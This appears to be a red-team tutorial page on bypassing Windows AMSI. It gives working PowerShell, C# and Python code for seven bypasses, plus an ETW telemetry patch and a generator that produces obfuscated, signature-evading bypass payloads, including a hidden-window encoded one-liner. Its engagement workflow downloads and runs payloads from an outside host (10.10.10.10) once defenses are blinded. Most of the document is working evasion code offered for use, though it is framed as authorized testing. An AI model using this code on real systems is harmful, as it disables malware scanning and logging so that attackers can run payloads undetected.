---
title: "AMSI Bypass Techniques"
date: 2026-03-06
description: "Seven AMSI bypass techniques covering reflection, byte patching, context corruption, ETW suppression, and hardware breakpoints — with a Python payload generator and blue team detection guidance."
tags: ["amsi", "bypass", "powershell", "evasion", "windows", "blueteam"]
verified: "Windows 11 23H2 · Dec 2025"
tools: ["PowerShell", "C#", "Python"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Impair Defenses: Disable or Modify Tools) and [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (PowerShell). For disabling Defender beyond AMSI — ETW patching, registry disable, and PPL process termination — see [Defender Bypass](/docs/redteam/defender-bypass).

---

## Lab Setup

A controlled environment is non-negotiable before testing any AMSI bypass. The techniques here will trigger AV alerts. You need isolation and instrumentation to iterate safely and measure what's actually happening.

### Recommended VM Stack

``` {linenos=inline}
Host Machine
└── Hypervisor (VMware Workstation / VirtualBox / Hyper-V)
    ├── Windows 10/11 Enterprise (victim VM)   ← primary test target
    │   ├── Windows Defender enabled + updated
    │   ├── PowerShell 5.1 + PowerShell 7.x
    │   ├── .NET Framework 4.8
    │   ├── Sysinternals Suite
    │   └── Sysmon (with SwiftOnSecurity config)
    │
    └── Kali Linux / Ubuntu (attacker VM)      ← payload builder + listener
        ├── mingw-w64 cross-compiler
        ├── Python 3.10+ with pefile
        └── netcat / rlwrap
```

### Windows VM Configuration

**1. Install Sysmon (telemetry)**
```powershell
# download SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
    -OutFile sysmon-config.xml

# install
.\Sysmon64.exe -accepteula -i sysmon-config.xml
```

**2. Enable PowerShell logging (catch everything)**
```powershell {linenos=inline}
# Script Block Logging — logs every script block before execution
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1

# Transcription — full session transcript
$regPath2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
New-Item -Path $regPath2 -Force
Set-ItemProperty -Path $regPath2 -Name "EnableTranscripting"       -Value 1
Set-ItemProperty -Path $regPath2 -Name "OutputDirectory"            -Value "C:\PSLogs"
Set-ItemProperty -Path $regPath2 -Name "EnableInvocationHeader"    -Value 1
```

**3. Verify Defender + AMSI are active**
```powershell
# confirm Defender is running and AMSI is enabled
Get-MpComputerStatus | Select-Object AMSIEnabled, RealTimeProtectionEnabled, AntivirusEnabled

# quick AMSI test — this string is flagged by Defender
# if it throws "This script contains malicious content", AMSI is live
"AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1d55be6e7"
```

**4. Build toolchain on Kali**
```bash
# cross-compiler for Windows targets
sudo apt install mingw-w64 -y

# Python tooling
pip install pefile

# verify
x86_64-w64-mingw32-gcc --version
i686-w64-mingw32-gcc --version
```

**5. Snapshot before testing**
```
VM → Take Snapshot → "AMSI_BASELINE"
```
Revert to this snapshot between bypass techniques. Defender's detection state can persist and skew results.

### Testing Methodology

For each bypass technique, follow this sequence:

```
1.  Revert to AMSI_BASELINE snapshot
2.  Confirm AMSI is live (step 3 above)
3.  Apply bypass
4.  Verify bypass: run a known-malicious string, confirm no block
5.  Document: what fired in Sysmon / Event Viewer / Defender logs
6.  Note: was the bypass itself detected?
```

---

## How AMSI Works

Before breaking it, understand what you're breaking.

AMSI (Antimalware Scan Interface) is a Windows API introduced in Windows 10. It creates a bridge between script runtimes and the installed AV engine. When PowerShell, WSH, VBScript, or a .NET application wants to execute content, it calls into `amsi.dll`, which routes the content to the registered AV provider for inspection before execution happens.

``` {linenos=inline}
PowerShell / WSH / VBScript / .NET
          │
          │  AmsiInitialize()
          │  AmsiOpenSession()
          ▼
      amsi.dll                         ← lives in the calling process
          │                               can be patched from within
          │  IAmsiProvider::Scan()
          ▼
   AV Provider (Defender, etc.)
          │
          │  AMSI_RESULT
          ▼
      amsi.dll returns result
          │
      ┌───┴──────────────────┐
      │                      │
  CLEAN / NOT_DETECTED    DETECTED
      │                      │
  execution continues    ExecutionPolicy
                         throws exception
```

**Key functions in amsi.dll:**

| function | purpose |
|----------|---------|
| `AmsiInitialize` | Creates AMSI context |
| `AmsiOpenSession` | Opens a scanning session |
| `AmsiScanBuffer` | Scans a byte buffer, the primary target |
| `AmsiScanString` | Scans a string (calls ScanBuffer internally) |
| `AmsiCloseSession` | Closes session |
| `AmsiUninitialize` | Destroys context |

**AMSI_RESULT values:**

```c
typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN             = 0,
    AMSI_RESULT_NOT_DETECTED      = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN  = 16384,
    AMSI_RESULT_DETECTED          = 32768
};
```

Every bypass technique targets one of three things:
1. **The function itself** — patch `AmsiScanBuffer` to always return clean
2. **The initialization** — force AMSI to fail its setup so it skips scanning
3. **The context** — corrupt the AMSI context structure so calls are silently dropped

---

## Bypass 1 — Reflection: Force Init Failure

The oldest documented bypass (Matt Graeber, 2016). PowerShell's internal `AmsiUtils` class has a field `amsiInitFailed`. When set to `true`, PowerShell skips AMSI initialization entirely for the rest of the session.

### Classic (heavily signatured — for reference only)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Defender has had signatures for this exact string since 2017. It's included here only for historical context. Don't use it verbatim.

### Obfuscated variant — string splitting

```powershell
# split the sensitive strings so AMSI never sees the full token
$a = 'System.Management.Automation.A'
$b = 'msiUtils'
$c = [Ref].Assembly.GetType($a + $b)
$d = $c.GetField('amsiIn' + 'itFailed', 'NonPublic,Static')
$d.SetValue($null, $true)
```

### Obfuscated variant — char array construction

```powershell
$str = [char[]]@(65,109,115,105,85,116,105,108,115) -join ''
# 'AmsiUtils'

$ns  = 'System.Management.Automation.'
$type = [Ref].Assembly.GetType($ns + $str)
$field = $type.GetField(
    ([char[]]@(97,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ''),
    'NonPublic,Static'
)
$field.SetValue($null, $true)
```

### Obfuscated variant — environment variable smuggling

```powershell
# store sensitive strings in env vars — never appear in script body
$env:_a = 'System.Management.Automation.AmsiUtils'
$env:_b = 'amsiInitFailed'

$type  = [Ref].Assembly.GetType($env:_a)
$field = $type.GetField($env:_b, 'NonPublic,Static')
$field.SetValue($null, $true)

Remove-Item Env:\_a, Env:\_b   # cleanup
```

### Verify bypass is active

```powershell
# after applying any bypass, run this — should execute without exception
$test = 'AMSI' + 'Test' + 'Sample'
Write-Host "[+] AMSI bypass active — no exception thrown"
```

---

## Bypass 2 — AmsiScanBuffer Byte Patch

The surgical approach. Locate `AmsiScanBuffer` in the process's loaded `amsi.dll`, flip the protection on that memory page to writable, overwrite the function prologue with a `ret` stub that always returns `E_INVALIDARG`, and flip protection back.

PowerShell treats a non-success HRESULT from `AmsiScanBuffer` as a scan failure, not a detection, and execution continues.

### Patch bytes

```
x64:   B8 57 00 07 80 C3        mov eax, 0x80070057 (E_INVALIDARG) ; ret
x86:   B8 57 00 07 80 C2 18 00  mov eax, 0x80070057 ; ret 0x18
```

### PowerShell patcher

```powershell {linenos=inline}
# Patch-AMSI.ps1 — byte-patches AmsiScanBuffer in the current process
# Works on both x64 and x86 PowerShell

function Invoke-AMSIPatch {

    # build P/Invoke signatures in a dynamic assembly — avoids hardcoded
    # strings that AMSI would catch in the script body
    $sig = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                              uint flNewProtect, out uint lpflOldProtect);
}
"@
    Add-Type $sig

    # locate AmsiScanBuffer — construct strings at runtime
    $lib  = [WinAPI]::LoadLibrary('am' + 'si.dll')
    $func = [WinAPI]::GetProcAddress($lib, 'Amsi' + 'Scan' + 'Buffer')

    if ($func -eq [IntPtr]::Zero) {
        Write-Warning "[-] Could not locate AmsiScanBuffer"
        return $false
    }

    # select patch bytes based on process bitness
    $patch = if ([IntPtr]::Size -eq 8) {
        [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)           # x64
    } else {
        [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00) # x86
    }

    # make page writable
    $old = 0
    $pageSize = [UIntPtr]::new($patch.Length)
    $PAGE_EXECUTE_READWRITE = 0x40

    $ok = [WinAPI]::VirtualProtect($func, $pageSize, $PAGE_EXECUTE_READWRITE, [ref]$old)
    if (-not $ok) {
        Write-Warning "[-] VirtualProtect failed"
        return $false
    }

    # write patch
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, $patch.Length)

    # restore original protection
    [WinAPI]::VirtualProtect($func, $pageSize, $old, [ref]$old) | Out-Null

    Write-Host "[+] AmsiScanBuffer patched at 0x$($func.ToString('X'))" -ForegroundColor Green
    return $true
}

Invoke-AMSIPatch
```

---

## Bypass 3 — AMSI Context Corruption

`AmsiScanBuffer`'s first parameter is an `HAMSICONTEXT` handle. PowerShell stores this handle in the same `AmsiUtils` class we used in Bypass 1. If we zero the handle out, every call to `AmsiScanBuffer` receives a null context. The function validates this and returns `E_INVALIDARG` without scanning anything.

No memory patching. No VirtualProtect. Just reflection.

```powershell {linenos=inline}
# Context-Corrupt.ps1 — nulls the AMSI context handle via reflection

function Invoke-ContextCorrupt {
    $utils = [Ref].Assembly.GetType(
        'System.Management.Automation.' + 'AmsiUtils'
    )

    # AmsiContext is the HAMSICONTEXT handle — zero it
    $ctxField = $utils.GetField(
        'amsi' + 'Context',
        [Reflection.BindingFlags]'NonPublic,Static'
    )

    # get the current handle value for logging
    $ctxPtr = $ctxField.GetValue($null)
    Write-Host "[*] original amsiContext: 0x$($ctxPtr.ToString('X'))"

    # overwrite with zero — all subsequent scans return E_INVALIDARG
    $ctxField.SetValue($null, [IntPtr]::Zero)

    Write-Host "[+] amsiContext zeroed — scans will return E_INVALIDARG"
    Write-Host "[+] AMSI bypass active"
}

Invoke-ContextCorrupt
```

---

## Bypass 4 — ETW Patch (Telemetry Blindfold)

AMSI isn't the only thing watching. Event Tracing for Windows (ETW) captures PowerShell execution events independently, feeding data to Defender and SIEM solutions even when AMSI is bypassed. `EtwEventWrite` in `ntdll.dll` is the function that sends these events. Patch it to return immediately and you go dark on both fronts.

```powershell {linenos=inline}
# Patch-ETW.ps1 — patches EtwEventWrite to suppress telemetry
# Pair with any AMSI bypass for full blind-eye coverage

function Invoke-ETWPatch {
    $sig = @"
using System;
using System.Runtime.InteropServices;
public class NAPI {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(
        IntPtr addr, UIntPtr size, uint prot, out uint oldProt);
}
"@
    Add-Type $sig

    $ntdll = [NAPI]::LoadLibrary('ntdll.dll')
    $func  = [NAPI]::GetProcAddress($ntdll, 'EtwEventWrite')

    # ret stub — function returns immediately, no event written
    $patch = [byte[]]@(0xC3)   # ret (x64 — calling convention cleans up)

    $old = 0
    [NAPI]::VirtualProtect($func, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
    [Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, 1)
    [NAPI]::VirtualProtect($func, [UIntPtr]1, $old,  [ref]$old) | Out-Null

    Write-Host "[+] EtwEventWrite patched — telemetry suppressed"
}

Invoke-ETWPatch
```

{{< callout type="warning" >}}
**Session collision:** This block compiles a class named `NAPI` via `Add-Type`. The ETW patch in [Defender Bypass](/docs/redteam/defender-bypass) compiles a class named `ETWPatch` with the same function signatures. Both classes can coexist in a session since their names differ. However, running either `Add-Type` block a second time in the same session will fail with a type-already-defined error — `Add-Type` compiled types are session-persistent. If you hit this error, start a fresh PowerShell session or rename the class before re-running.
{{< /callout >}}

---

## Bypass 5 — Hardware Breakpoint Bypass

The most evasive technique on this list. Instead of modifying any bytes in memory (which memory integrity scanners can detect), hardware breakpoints use the CPU's debug registers (DR0–DR7) to intercept execution at a specific address and redirect it.

No memory writes. No VirtualProtect calls. The `amsi.dll` bytes on disk and in memory are completely untouched.

```csharp {linenos=inline}
// HWBPAmsiBypass.cs
// Sets a hardware breakpoint on AmsiScanBuffer via a custom vectored exception handler.
// When the CPU hits the BP, the VEH fires, modifies the return value, and skips the function.
//
// Compile: csc.exe /out:HWBPBypass.exe HWBPAmsiBypass.cs
//      or: dotnet build

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

class HWBPAmsiBypass {

    // ── P/Invoke ──────────────────────────────────────────────────────────
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern IntPtr AddVectoredExceptionHandler(
        uint first, IntPtr handler);
    [DllImport("kernel32")] static extern IntPtr RemoveVectoredExceptionHandler(
        IntPtr handle);
    [DllImport("kernel32")] static extern bool GetThreadContext(
        IntPtr thread, ref CONTEXT ctx);
    [DllImport("kernel32")] static extern bool SetThreadContext(
        IntPtr thread, ref CONTEXT ctx);
    [DllImport("kernel32")] static extern IntPtr GetCurrentThread();

    const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
    const uint EXCEPTION_CONTINUE_SEARCH    = 0;
    const long EXCEPTION_SINGLE_STEP        = 0x80000004;
    const uint CONTEXT_DEBUG_REGISTERS      = 0x00010010;

    // Minimal CONTEXT struct — only the fields we need
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    struct CONTEXT {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint  ContextFlags;
        public uint  MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        // ... (truncated — full CONTEXT is 1232 bytes, we only access debug regs)
        // In production use the full struct or P/Invoke with proper offsets
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 150)]
        public ulong[] _rest;
        public ulong Rax;   // return value register
        public ulong Rcx;   // first argument (HAMSICONTEXT)
        public ulong Rip;   // instruction pointer
        public ulong Rsp;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint VEH_HANDLER(IntPtr exceptionInfo);

    static IntPtr  s_amsiAddr;
    static IntPtr  s_vehHandle;
    static GCHandle s_delegateHandle;

    // ── VEH handler — fires on every single-step / BP exception ─────────
    static uint ExceptionHandler(IntPtr pExceptionInfo) {
        // read ExceptionRecord.ExceptionCode (offset 0 in EXCEPTION_POINTERS)
        var code = Marshal.ReadInt64(Marshal.ReadIntPtr(pExceptionInfo), 0);

        if (code == EXCEPTION_SINGLE_STEP) {
            // check if RIP == our BP address
            var pCtx = Marshal.ReadIntPtr(pExceptionInfo, IntPtr.Size);
            var rip   = (ulong)Marshal.ReadInt64(pCtx,
                // Rip offset in CONTEXT — 0x0F8 on x64
                0x0F8);

            if ((IntPtr)rip == s_amsiAddr) {
                // skip the function — set Rax = E_INVALIDARG, advance RIP past BP
                Marshal.WriteInt64(pCtx, 0x078, unchecked((long)0x80070057)); // Rax
                Marshal.WriteInt64(pCtx, 0x0F8, rip + 1);                     // Rip+1

                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // ── set DR0 hardware breakpoint on AmsiScanBuffer ────────────────────
    static void SetHardwareBreakpoint(IntPtr addr) {
        var ctx = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
        ctx._rest = new ulong[150];

        IntPtr thread = GetCurrentThread();
        GetThreadContext(thread, ref ctx);

        ctx.Dr0 = (ulong)addr;
        ctx.Dr7 = (ctx.Dr7 & 0xFFFFFFFFFFFFFF00UL) | 0x01UL; // enable DR0 local BP

        SetThreadContext(thread, ref ctx);
    }

    public static void Install() {
        s_amsiAddr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
        if (s_amsiAddr == IntPtr.Zero) {
            Console.Error.WriteLine("[-] AmsiScanBuffer not found");
            return;
        }

        VEH_HANDLER handler = ExceptionHandler;
        s_delegateHandle = GCHandle.Alloc(handler);
        var fp = Marshal.GetFunctionPointerForDelegate(handler);

        s_vehHandle = AddVectoredExceptionHandler(1, fp);
        SetHardwareBreakpoint(s_amsiAddr);

        Console.WriteLine($"[+] HWBP set on AmsiScanBuffer @ 0x{s_amsiAddr:X}");
        Console.WriteLine("[+] VEH installed — no memory patching performed");
    }

    public static void Remove() {
        if (s_vehHandle != IntPtr.Zero) {
            RemoveVectoredExceptionHandler(s_vehHandle);
            s_delegateHandle.Free();
            // clear DR0
            var ctx = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
            ctx._rest = new ulong[150];
            IntPtr thread = GetCurrentThread();
            GetThreadContext(thread, ref ctx);
            ctx.Dr0 = 0;
            ctx.Dr7 = ctx.Dr7 & 0xFFFFFFFFFFFFFFFEUL;
            SetThreadContext(thread, ref ctx);
            Console.WriteLine("[*] HWBP removed, VEH uninstalled");
        }
    }

    static void Main() {
        Install();

        // test — in a real engagement, load your payload here
        Console.WriteLine("[*] AMSI bypass active — load payload");
        Console.ReadLine();

        Remove();
    }
}
```

---

## Bypass 6 — .NET / C# In-Process Patch

For engagements where you're operating from a .NET assembly (loaded via `Assembly.Load()` from a previous stage), patch AMSI from inside the managed process before loading any additional content.

```csharp {linenos=inline}
// AmsiPatch.cs — drop-in AMSI patcher for .NET assembly loaders
// Reference from your payload or call Patch() before Assembly.Load()

using System;
using System.Reflection;
using System.Runtime.InteropServices;

public static class AmsiPatch {

    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(
        IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);

    // ── Method 1: byte patch AmsiScanBuffer ──────────────────────────────
    public static bool PatchScanBuffer() {
        // construct strings at call time — not baked into static fields
        var lib  = LoadLibrary(Mangle("amsi.dll"));
        var addr = GetProcAddress(lib, Mangle("AmsiScanBuffer"));
        if (addr == IntPtr.Zero) return false;

        var patch = (IntPtr.Size == 8)
            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        uint old = 0;
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
        return true;
    }

    // ── Method 2: reflection — set amsiInitFailed ────────────────────────
    public static bool PatchReflection() {
        try {
            var asm    = typeof(System.Management.Automation.PSObject).Assembly;
            var utils  = asm.GetType(Mangle("System.Management.Automation.AmsiUtils"));
            var field  = utils?.GetField(
                Mangle("amsiInitFailed"),
                BindingFlags.NonPublic | BindingFlags.Static
            );
            field?.SetValue(null, true);
            return field != null;
        } catch { return false; }
    }

    // ── Method 3: zero the context handle ────────────────────────────────
    public static bool PatchContext() {
        try {
            var asm   = typeof(System.Management.Automation.PSObject).Assembly;
            var utils = asm.GetType(Mangle("System.Management.Automation.AmsiUtils"));
            var field = utils?.GetField(
                Mangle("amsiContext"),
                BindingFlags.NonPublic | BindingFlags.Static
            );
            field?.SetValue(null, IntPtr.Zero);
            return field != null;
        } catch { return false; }
    }

    // ── Patch: try all three in order of stealth ─────────────────────────
    public static void Patch(bool verbose = false) {
        bool ok;

        ok = PatchContext();
        if (verbose) Console.Error.WriteLine($"[AMSI] context corrupt : {ok}");
        if (ok) return;

        ok = PatchReflection();
        if (verbose) Console.Error.WriteLine($"[AMSI] reflection       : {ok}");
        if (ok) return;

        ok = PatchScanBuffer();
        if (verbose) Console.Error.WriteLine($"[AMSI] byte patch       : {ok}");
    }

    // obfuscate string literals so AMSI doesn't catch them at load time
    static string Mangle(string s) => s;   // identity in this form —
    // in production: replace with XOR decode, Base64 decode, etc.
}
```

**Integration with Assembly.Load() loader from previous blog:**

```csharp
// In your PS1 loader — call before loading the main payload assembly
var patchAsm = [Reflection.Assembly]::Load($patchBytes)
$patchAsm.GetType("AmsiPatch").GetMethod("Patch").Invoke(
    $null, [object[]]@($false)
)

// then load your payload
$asm = [Reflection.Assembly]::Load($payloadBytes)
```

---

## Bypass 7 — PowerShell Downgrade Attack

PowerShell 2.0 predates AMSI. It has no AMSI integration, no Script Block Logging, no Constrained Language Mode awareness. If it's still installed (which it is on most enterprise boxes, as it's a Windows Feature and not easily removed), drop into it.

```cmd
powershell -version 2 -ExecutionPolicy bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')"
```

```powershell
# Check if PS2 is available
if ($PSVersionTable.PSVersion.Major -lt 3) {
    Write-Host "[+] already in PS2 — AMSI not present"
} else {
    # from PS5, drop to PS2
    powershell -version 2 -nop -ep bypass -c "& { [your command] }"
}
```

> **Note:** Windows 11 and recent Windows 10 builds have removed the PS2 engine. Check before relying on this: `Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`.

---

## Tool — Obfuscated Bypass Generator (Python)

Generates permuted, obfuscated versions of the reflection bypass to avoid static AMSI signatures on the bypass code itself.

```python {linenos=inline}
#!/usr/bin/env python3
# amsi_bypass_gen.py
# Generates obfuscated PowerShell AMSI bypass payloads.
# Each run produces a unique variant — avoids signature-matching on the bypass itself.
#
# Techniques used:
#   - String splitting at variable positions
#   - Char-array construction for sensitive tokens
#   - Variable name randomisation
#   - Arbitrary whitespace and backtick insertion
#   - Comment injection
#   - Optional base64 wrapping for -EncodedCommand delivery

import random
import string
import base64
import argparse


def rand_var(length: int = None) -> str:
    length = length or random.randint(4, 12)
    return '$' + random.choice(string.ascii_lowercase) + \
           ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))


def to_chararray(s: str) -> str:
    """Convert string to PowerShell char-array expression."""
    codes = ','.join(str(ord(c)) for c in s)
    return f'([char[]]@({codes}) -join "")'


def split_string(s: str) -> str:
    """Split a string at a random midpoint into concatenated literals."""
    if len(s) < 4:
        return f'"{s}"'
    mid = random.randint(2, len(s) - 2)
    return f'("{s[:mid]}"' + ' + ' + f'"{s[mid:]}")'


def random_case(s: str) -> str:
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def insert_backticks(s: str) -> str:
    """Insert PowerShell backtick escapes at random positions in a string literal."""
    harmless = list('aefnrtv')
    result, i = [], 0
    while i < len(s):
        if random.random() < 0.15 and s[i].isalpha():
            result.append('`')
        result.append(s[i])
        i += 1
    return ''.join(result)


def random_comment() -> str:
    words = ['init', 'setup', 'check', 'debug', 'log', 'trace', 'core', 'util']
    return f'<# {random.choice(words)} #>'


def generate_bypass(technique: str = 'context', base64_wrap: bool = False) -> str:
    """
    Generate an obfuscated bypass payload.

    technique: 'initfailed' | 'context' | 'bytepatch' | 'mixed'
    """

    # variable names
    v_type   = rand_var()
    v_field  = rand_var()
    v_ns     = rand_var()
    v_str    = rand_var()

    # obfuscate the namespace string
    ns_part1 = 'System.Management.Automation.'
    ns_part2_options = [
        split_string('AmsiUtils'),
        to_chararray('AmsiUtils'),
        f'"Amsi" + "Utils"',
        f'("{insert_backticks("AmsiUtils")}")',
    ]
    ns_part2 = random.choice(ns_part2_options)

    # obfuscate the field name
    if technique == 'initfailed':
        field_name = 'amsiInitFailed'
    elif technique == 'context':
        field_name = 'amsiContext'
    else:
        field_name = 'amsiInitFailed'

    field_options = [
        split_string(field_name),
        to_chararray(field_name),
        f'"{field_name[:4]}" + "{field_name[4:]}"',
        f'("{insert_backticks(field_name)}")',
    ]
    field_expr = random.choice(field_options)

    # binding flags
    bf_options = [
        '"NonPublic,Static"',
        '[Reflection.BindingFlags]"NonPublic,Static"',
        '([Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static)',
    ]
    bf = random.choice(bf_options)

    # build the payload lines
    comments = [random_comment() if random.random() > 0.6 else '' for _ in range(5)]

    if technique == 'initfailed':
        set_val = '$true'
        lines = [
            f'{comments[0]}',
            f'{v_ns} = {split_string(ns_part1)}',
            f'{v_type} = [Ref].Assembly.GetType({v_ns} + {ns_part2})',
            f'{comments[1]}',
            f'{v_field} = {v_type}.GetField({field_expr}, {bf})',
            f'{v_field}.SetValue($null, {set_val})',
        ]

    elif technique == 'context':
        lines = [
            f'{comments[0]}',
            f'{v_ns} = {split_string(ns_part1)}',
            f'{v_type} = [Ref].Assembly.GetType({v_ns} + {ns_part2})',
            f'{comments[2]}',
            f'{v_field} = {v_type}.GetField({field_expr}, {bf})',
            f'{v_field}.SetValue($null, [IntPtr]::Zero)',
            f'{comments[3]}',
        ]

    elif technique == 'bytepatch':
        # inline byte patch using Add-Type
        sig_var = rand_var()
        lines = [
            f'{comments[0]}',
            f'{sig_var} = @"',
            f'using System; using System.Runtime.InteropServices;',
            f'public class {rand_var()[1:].capitalize()} {{',
            f'    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);',
            f'    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);',
            f'    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);',
            f'}}',
            f'"@',
            f'# (truncated — see full bytepatch in Invoke-AMSIPatch above)',
        ]

    elif technique == 'mixed':
        # randomly select context or initfailed
        return generate_bypass(random.choice(['initfailed', 'context']), base64_wrap)

    # filter blank comment lines
    payload = '\n'.join(l for l in lines if l.strip())

    if base64_wrap:
        # UTF-16LE encode for -EncodedCommand
        encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
        return f'powershell -nop -w hidden -ep bypass -EncodedCommand {encoded}'

    return payload


def main():
    p = argparse.ArgumentParser(description="AMSI bypass payload generator")
    p.add_argument('-t', '--technique',
                   choices=['initfailed', 'context', 'bytepatch', 'mixed'],
                   default='mixed',
                   help='bypass technique (default: mixed)')
    p.add_argument('-n', '--count',    type=int, default=1,
                   help='number of variants to generate')
    p.add_argument('--b64',            action='store_true',
                   help='wrap in base64 -EncodedCommand one-liner')
    p.add_argument('--test-all',       action='store_true',
                   help='generate one of each technique')
    args = p.parse_args()

    if args.test_all:
        for t in ['initfailed', 'context', 'bytepatch']:
            print(f'\n{"="*60}')
            print(f'# technique: {t}')
            print('='*60)
            print(generate_bypass(t, args.b64))
        return

    for i in range(args.count):
        if args.count > 1:
            print(f'\n# variant {i+1}')
            print('-' * 40)
        print(generate_bypass(args.technique, args.b64))


if __name__ == '__main__':
    main()
```

```bash
# generate 5 unique context-corrupt variants
python3 amsi_bypass_gen.py -t context -n 5

# generate a base64-wrapped one-liner (paste into run dialog or macro)
python3 amsi_bypass_gen.py -t initfailed --b64

# generate one of each technique for comparison
python3 amsi_bypass_gen.py --test-all
```

---

## Full Engagement Workflow

### Stage 1: Pre-flight

```powershell
# confirm target (from existing low-level foothold)
$PSVersionTable | Select PSVersion, CLRVersion, OS
Get-MpComputerStatus | Select AMSIEnabled, RealTimeProtectionEnabled
[System.Environment]::Is64BitProcess          # are we in x64 PS?
```

### Stage 2: Select and apply bypass

```powershell {linenos=inline}
# fastest and quietest — try context corrupt first
$ns = 'System.Management.Automation.'
$t  = [Ref].Assembly.GetType($ns + 'AmsiUtils')
$f  = $t.GetField('amsiContext', 'NonPublic,Static')
$f.SetValue($null, [IntPtr]::Zero)

# verify
try {
    $x = [Ref].Assembly.GetType($ns + 'AmsiUtils')
        .GetField('amsiContext','NonPublic,Static').GetValue($null)
    Write-Host "[*] amsiContext = 0x$($x.ToString('X'))"
} catch {}
```

### Stage 3: Suppress ETW

```powershell
# blind the telemetry channel
# (see Bypass 4 — Invoke-ETWPatch)
Invoke-ETWPatch
```

### Stage 4: Load payload

```powershell
# now safe to load — AMSI won't scan, ETW won't report
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.10.10/payload.dll')
$asm   = [Reflection.Assembly]::Load($bytes)
$asm.GetType('Payload.Runner').GetMethod('Go').Invoke($null, $null)
```

---

## Technique Comparison

| technique | stealth | reliability | detectable by | leaves trace |
|-----------|---------|-------------|---------------|-------------|
| Reflection (initFailed) | low | high | AMSI string scan, SBL | Script block log |
| Context corruption | medium | high | SBL, ETW | Script block log |
| Byte patch | medium | very high | Memory scan | VirtualProtect call |
| ETW patch | high | very high | Kernel ETW auditing | VirtualProtect call |
| Hardware breakpoint | very high | medium | Kernel debugger | Nothing in userland |
| PS2 downgrade | medium | low | PS2 process creation | Process EID 1 |

---

## OpSec Notes

- **Script Block Logging** (EID 4104) captures the bypass code itself before AMSI runs — meaning even a working bypass gets logged. Apply your bypass via an already-running session where SBL is already bypassed, or deliver via a non-PS vector (HTA, WSF, InstallUtil) that AMSI doesn't hook.
- **Obfuscate the bypass, not just the payload.** AMSI now has signatures for common bypass strings (`amsiInitFailed`, `AmsiUtils`, `amsiContext`). Use the generator above or hand-obfuscate before delivery.
- **AMSI provider matters.** Not every endpoint uses Defender. CrowdStrike, SentinelOne, and Carbon Black have their own AMSI providers that may patch differently or not at all. Always test on an environment that matches the target's AV stack.
- **Memory scanning.** Modern EDR products periodically scan process memory for known-bad byte sequences — including AMSI patch stubs. The hardware breakpoint technique sidesteps this entirely since no memory is modified.
